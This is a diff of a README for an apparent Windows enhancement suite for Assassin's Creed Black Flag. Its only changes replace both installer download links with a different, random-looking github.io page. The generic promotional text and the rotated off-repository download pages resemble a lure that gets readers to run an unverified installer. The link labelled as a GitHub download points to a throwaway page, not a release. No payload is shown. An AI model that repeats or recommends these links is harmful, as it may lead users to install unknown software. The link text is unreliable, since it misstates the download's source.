@@ -2,7 +2,7 @@
 
 Assassin's Creed Black Flag Resynced is a powerful and dedicated tool designed specifically for Windows desktop users to elevate their gameplay in the classic title. This comprehensive suite offers a wide array of features that allow you to customize, optimize, and enhance every aspect of your experience, from combat to exploration, ensuring a more enjoyable and personalized adventure.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -91,7 +91,7 @@ For any issues, suggestions, or questions, visit the GitHub Issues page or join 
 
 Get the latest version of Assassin's Creed Black Flag Resynced Enhanced Suite here:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 *Last Updated: December 2026*
 
